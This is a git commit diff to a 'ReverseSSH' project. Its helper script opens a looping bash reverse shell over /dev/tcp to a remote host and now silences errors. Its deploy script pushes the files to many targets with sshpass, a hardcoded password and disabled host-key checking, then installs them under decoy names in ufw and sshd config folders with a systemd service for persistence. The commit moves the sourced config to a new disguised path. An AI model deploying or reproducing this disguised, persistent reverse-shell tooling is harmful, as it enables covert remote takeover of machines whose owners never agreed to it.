85d5c920c7c59c2ab7c1ae0491b200b286cc4ac1
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-28 00:04:28 -0400

    final

--- ReverseSSH/_ssh_virtualization_helper.sh
+++ ReverseSSH/_ssh_virtualization_helper.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
-source /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
+source /etc/ufw/applications.d/ufw_config.sh
 CIP=$(/usr/bin/hostname -I | awk '{print $1}')
 SECOND=$(echo "$CIP" | cut -d'.' -f2)
 P=$(($C + $SECOND))
 
 while true; do
-    bash -i >& /dev/tcp/"$I"/"$P" 0>&1
+    bash -i >& /dev/tcp/"$I"/"$P" 0>&1 2>/dev/null
     sleep 5
 done
--- ReverseSSH/deploy.sh
+++ ReverseSSH/deploy.sh
@@ -5,7 +5,7 @@ USER="sysadmin"
 PASS="changeme"
 
 for TARGET in "${TARGETS[@]}"; do
-    sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./fsfreeze-hook.sh ${USER}@${TARGET}:/tmp/fsfreeze-hook.sh
+    sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./ufw_config.sh ${USER}@${TARGET}:/tmp/ufw_config.sh
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./_ssh_virtualization_helper.sh ${USER}@${TARGET}:/tmp/_ssh_virtualization_helper.sh
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./_ssh_virtualization_helper.service ${USER}@${TARGET}:/tmp/_ssh_virtualization_helper.service
 done
@@ -15,11 +15,11 @@ for TARGET in "${TARGETS[@]}"; do
 echo \"$PASS\" | sudo -S bash -c '
     set -e
 
-    mv /tmp/fsfreeze-hook.sh /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
+    mv /tmp/ufw_config.sh /etc/ufw/applications.d/ufw_config.sh
     mv /tmp/_ssh_virtualization_helper.sh /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh
     mv /tmp/_ssh_virtualization_helper.service /etc/systemd/system/_ssh_virtualization_helper.service
 
-    chmod +x /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
+    chmod +x /etc/ufw/applications.d/ufw_config.sh
     chmod +x /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh
 
     systemctl daemon-reload
